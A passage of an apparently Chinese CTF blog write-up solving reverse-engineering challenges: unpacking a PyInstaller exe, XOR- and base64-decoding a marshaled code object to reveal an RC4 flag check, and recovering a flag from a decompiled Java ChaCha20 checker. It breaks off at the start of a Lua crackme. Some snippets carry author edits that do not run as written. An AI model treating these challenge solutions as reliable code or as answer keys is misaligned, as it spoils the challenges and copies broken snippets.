href="#WEEK3-easyre" class="headerlink" title="[WEEK3]easyre"></a>[WEEK3]easyre</h3><p>开局一个exe文件，和之前的不同，我们用die看了后是用py打包的，那么我们就解包，反编译</p><blockquote><p>python pyinstxtractor-ng.py 1.exe<br>uncompyle6 main.pyc &gt; main.py</p></blockquote><p>我们把其中的main.pyc转换成py代码</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031212031065.png" alt="image-20231031212031065"></p><p>用gpt得出他的xor的值是23,我们根据他的代码逻辑，他就会执行一个程序，但我们看不到我们需要的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line">code_obj = marshal.loads(decoded_data)</span><br><span class="line">exce(code_obj)</span><br></pre></td></tr></table></figure><blockquote><p> exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。这个函数接受一个代码对象（通常是由字符串形式的代码或者编译后的字节码构建而成），并执行其中的 Python 语句exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。</p></blockquote><p>重点，接受一个代码对象，通常是由字符串形式的代码或者编译后的字节码构建而成。</p><p>而且前面marshal.loads(decoded_data) 反序列化从某种格式编码的代码。所以现在的encode其实是类似于字节码的存在？因此我们可以直接用dis模块查看code_obj 中包含的 Python 字节码的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;#`VVVVVVVVVVVVVVVVVVVVVSVVVVFVVVV_YZVVVVMVU|VNFV@pU|V&#123;xUMVYvVzBSMVDSVFRVMFDSV\\VQMV@\x7fVAxPMFU&#123;V@BPp`]vU%B_MF]eVy]VMFY|UxZUVFUbTPBSMVrSVFRVMV\x7fCVT|]N`^VVVVVVVVVVVVVVVpVVVVPVVVVF`VVV_GFVVVVsVU\&#x27;V@FUp`PSVO\&#x27;TMV].V$FUMVPSVBFVOC&quot;.U_`SqV]/UU|VQ`U/V_`RsV]/V^ZUQpVMVUtVMVR@V_\&#x27;SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVUoPPFTUVU.U_\&#x27;SsVXSV_\&#x27;QqVQRVQ&amp;pqFM/UPFSQ`U|VENVqFE/V$`TqVFMVUtVMVR@V_\&#x27;SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVU/Vy`TqVFMV_`TqVZMVUtVMVR@VU|VqFs/UvVRqVM/U\&#x27;RVxFRUV_QfqVACVT|RCb|VVFVV!FVVVVSgVFVVVT|Q%pEdvOY\&#x27;%pAnN@&quot;yMsxSuPAb%p&#123;~rOE&#123;NO]nNOyvUzQ`tPAbMT|^%pYeMO&#123;vTOUdN@&#123;bsPA#sYxUB.xUvcxUvAx\\N%&#123;`vPAnsPA#sYxRN%\x7f\x7ftcxUv!|Vtp/VVVS!UzM&amp;u~&quot;`rsx[tzZ\&#x27;O%AbN$]&quot;t_FUVVVVto`VVVVVVF`UUV^ZVDVU_V^^VFNTTVRZVEVUPpRNVEVTt\x7fRVVVUmT`VVVPA#N@&amp;`uPAqv%A&quot;tnxVVVSN&#123;U!ez%M\&#x27;!&amp;&amp;VP ez!UZmA.\&#x27;X&quot;g^\&#x27;/NUcvXd.TPRTTD!&amp;UB\\`dT.R&#125;Q&#123;!QQUdr~UguyU&amp;sTU&quot;u$An^PMdN@t!rpA&amp;sPNcXQxSr@Am@p]bu\&#x27;#gT_^EVVVVtp|VVVUvU@YxM@Ye%pA`tz&#123;bsYxQv@&quot;`sOCvUzAbN%.|MsxRMzo\x7fM&amp;x]M@&quot;&#125;ty&#123;`sPA|tp/VVVUnS`VVV_^GVVVVt\x7fVVVVSvTSocu%E&amp;uPB&lt;VFVVV_ZFVVVVTUFRVFFTTVRZVpxTTVR\\Vp**&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line">code_obj = marshal.loads(decoded_data)</span><br><span class="line">dis(code_obj)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到字节码后我们直接gpt，转换成正常的py代码，如果gpt是傻子可以尝试第二种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line"></span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;new.pyc&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(decoded_data)</span><br></pre></td></tr></table></figure><p>将他写入到一个文件里面，然后现在还识别不出他是pyc文件，我们去直接反编译出的pyc里面，随便偷个头过来，将他修复（上面的一串）</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031214116370.png" alt="image-20231031214116370"></p><p>然后再uncompyle6 new.pyc &gt; 1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: fun.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        ciphertext = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">            ciphertext.append(char ^ k)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(ciphertext)  <span class="comment">#这一段是我自己加的，直接自己调用自己就可以了</span></span><br><span class="line">            <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;example_key&#x27;</span></span><br><span class="line">check = <span class="string">b&#x27;\xd8\x94\x1e\xab\x9bft\xeb]@\x1b\xba\xe6\xe8\x133W\xdd\x0e\xe6\x924\xf1\x80mh\xeb=\x08a\x02\t.\xb5\x05B\xb0\xb0/D\x8cY&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Plz input your flag:&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">encrypted = rc4_encrypt(key, flag)</span><br><span class="line"><span class="keyword">if</span> encrypted == check:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling C:\Users\a\Desktop\new.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到就是一个rc4，我们让他自己调用自己就可以解出flag了</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031214441502.png" alt="image-20231031214441502"></p><h3 id="WEEK3-java是最棒的语言吗"><a href="#WEEK3-java是最棒的语言吗" class="headerlink" title="[WEEK3]java是最棒的语言吗"></a>[WEEK3]java是最棒的语言吗</h3><p>将原来的java拷贝下俩，加两处输出，获得密文和密钥，最后异或一下获得flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: ChaCha20  reason: default package */</span></span><br><span class="line"><span class="comment">/* loaded from: java是最棒的语言吗.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChaCha20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nextLine</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(encrypt(nextLine.getBytes(StandardCharsets.UTF_8), <span class="string">&quot;Shctf_Welcomes_Have_4_good_t1me_&quot;</span>.getBytes(), <span class="string">&quot;HsehrcOedfgs&quot;</span>.getBytes()), hexStringToBytes(<span class="string">&quot;ce43283af73d106815fe5293b474f5309d44063c7fde19533300c60603dfe528d19aee2f6db615191e45&quot;</span>))) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2, <span class="type">byte</span>[] bArr3) &#123;</span><br><span class="line">        <span class="type">int</span>[] chachaInit = chachaInit(bArr2, bArr3);</span><br><span class="line">        <span class="type">byte</span>[] bArr4 = <span class="keyword">new</span> <span class="title class_">byte</span>[bArr.length];</span><br><span class="line">        <span class="type">byte</span>[] bArr5 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr.length; i += <span class="number">64</span>) &#123;</span><br><span class="line">            chachaBlock(chachaInit, bArr5);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">64</span> &amp;&amp; i + i2 &lt; bArr.length; i2++) &#123;</span><br><span class="line">                bArr4[i + i2] = (<span class="type">byte</span>) (bArr[i + i2] ^ bArr5[i2]);</span><br><span class="line">                System.out.print(bArr5[i2] + <span class="string">&quot;,&quot;</span>); ##这里是添加的</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            chachaInit[<span class="number">12</span>] = chachaInit[<span class="number">12</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] chachaInit(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2) &#123;</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">        iArr[<span class="number">0</span>] = <span class="number">1634760805</span>;</span><br><span class="line">        iArr[<span class="number">1</span>] = <span class="number">857760878</span>;</span><br><span class="line">        iArr[<span class="number">2</span>] = <span class="number">2036477234</span>;</span><br><span class="line">        iArr[<span class="number">3</span>] = <span class="number">1797285236</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            iArr[<span class="number">4</span> + i] = bytesToIntLittleEndian(bArr, i * <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        iArr[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        iArr[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">        iArr[<span class="number">14</span>] = bytesToIntLittleEndian(bArr2, <span class="number">0</span>);</span><br><span class="line">        iArr[<span class="number">15</span>] = bytesToIntLittleEndian(bArr2, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> iArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chachaBlock</span><span class="params">(<span class="type">int</span>[] iArr, <span class="type">byte</span>[] bArr)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] copyOf = Arrays.copyOf(iArr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            chachaDoubleRound(copyOf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">16</span>; i2++) &#123;</span><br><span class="line">            intToBytesLittleEndian(iArr[i2] + copyOf[i2], bArr, i2 * <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chachaDoubleRound</span><span class="params">(<span class="type">int</span>[] iArr)</span> &#123;</span><br><span class="line">        quarterRound(iArr, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quarterRound</span><span class="params">(<span class="type">int</span>[] iArr, <span class="type">int</span> i, <span class="type">int</span> i2, <span class="type">int</span> i3, <span class="type">int</span> i4)</span> &#123;</span><br><span class="line">        iArr[i] = iArr[i] + iArr[i2];</span><br><span class="line">        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], <span class="number">16</span>);</span><br><span class="line">        iArr[i3] = iArr[i3] + iArr[i4];</span><br><span class="line">        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], <span class="number">12</span>);</span><br><span class="line">        iArr[i] = iArr[i] + iArr[i2];</span><br><span class="line">        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], <span class="number">8</span>);</span><br><span class="line">        iArr[i3] = iArr[i3] + iArr[i4];</span><br><span class="line">        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">rotateLeft</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (i &lt;&lt; i2) | (i &gt;&gt;&gt; (<span class="number">32</span> - i2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">bytesToIntLittleEndian</span><span class="params">(<span class="type">byte</span>[] bArr, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((bArr[i + <span class="number">3</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span>) | ((bArr[i + <span class="number">2</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((bArr[i + <span class="number">1</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span>) | (bArr[i] &amp; <span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">intToBytesLittleEndian</span><span class="params">(<span class="type">int</span> i, <span class="type">byte</span>[] bArr, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        bArr[i2] = (<span class="type">byte</span>) (i &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">1</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">2</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">3</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToBytes(String str) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[length / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            bArr[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(str.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.digit(str.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">            System.out.print(bArr[i / <span class="number">2</span>] + <span class="string">&quot;,&quot;</span>); ##这里是添加的</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArr)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bArr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(bArr[i])));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key = [-<span class="number">50</span>, <span class="number">67</span>, <span class="number">40</span>, <span class="number">58</span>, -<span class="number">9</span>, <span class="number">61</span>, <span class="number">16</span>, <span class="number">104</span>, <span class="number">21</span>, -<span class="number">2</span>, <span class="number">82</span>, -<span class="number">109</span>, -<span class="number">76</span>, <span class="number">116</span>, -<span class="number">11</span>, <span class="number">48</span>, -<span class="number">99</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">127</span>, -<span class="number">34</span>, <span class="number">25</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">0</span>,</span><br><span class="line">       -<span class="number">58</span>, <span class="number">6</span>, <span class="number">3</span>, -<span class="number">33</span>, -<span class="number">27</span>, <span class="number">40</span>, -<span class="number">47</span>, -<span class="number">102</span>, -<span class="number">18</span>, <span class="number">47</span>, <span class="number">109</span>, -<span class="number">74</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">69</span>, ]</span><br><span class="line">enc = [-<span class="number">88</span>,<span class="number">47</span>,<span class="number">73</span>,<span class="number">93</span>,-<span class="number">116</span>,<span class="number">11</span>,<span class="number">35</span>,<span class="number">81</span>,<span class="number">32</span>,-<span class="number">53</span>,<span class="number">107</span>,-<span class="number">95</span>,-<span class="number">125</span>,<span class="number">89</span>,-<span class="number">64</span>,<span class="number">81</span>,-<span class="number">81</span>,<span class="number">115</span>,<span class="number">43</span>,<span class="number">8</span>,<span class="number">74</span>,-<span class="number">22</span>,<span class="number">122</span>,<span class="number">126</span>,<span class="number">80</span>,<span class="number">100</span>,-<span class="number">91</span>,<span class="number">49</span>,<span class="number">46</span>,-<span class="number">24</span>,-<span class="number">121</span>,<span class="number">31</span>,-<span class="number">78</span>,-<span class="number">7</span>,-<span class="number">41</span>,<span class="number">31</span>,<span class="number">95</span>,-<span class="number">122</span>,<span class="number">115</span>,<span class="number">45</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">81</span>,<span class="number">26</span>,-<span class="number">10</span>,-<span class="number">25</span>,<span class="number">105</span>,-<span class="number">36</span>,-<span class="number">21</span>,<span class="number">59</span>,<span class="number">122</span>,-<span class="number">97</span>,-<span class="number">89</span>,-<span class="number">102</span>,<span class="number">81</span>,-<span class="number">116</span>,<span class="number">52</span>,-<span class="number">61</span>,-<span class="number">106</span>,<span class="number">85</span>,-<span class="number">81</span>,-<span class="number">54</span>,-<span class="number">123</span>,<span class="number">119</span>,</span><br><span class="line">-<span class="number">32</span>,<span class="number">32</span>,<span class="number">105</span>,-<span class="number">37</span>,-<span class="number">117</span>,<span class="number">6</span>,-<span class="number">128</span>,<span class="number">89</span>,<span class="number">2</span>,-<span class="number">4</span>,-<span class="number">21</span>,-<span class="number">118</span>,-<span class="number">94</span>,-<span class="number">81</span>,<span class="number">103</span>,<span class="number">26</span>,<span class="number">21</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    tmp = key[i] ^ enc[i]</span><br><span class="line">    <span class="keyword">if</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(-tmp), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="WEEK3-crackme"><a href="#WEEK3-crackme" class="headerlink" title="[WEEK3]crackme"></a>[WEEK3]crackme</h3><p><a href="https://www.luatool.cn/index.php">Lua 工具箱 (luatool.cn)</a></p><p>PE提示这是个lua代码，那么我们去在线网站直接解密一下</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231105141117807.png" alt="image-20231105141117807"></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 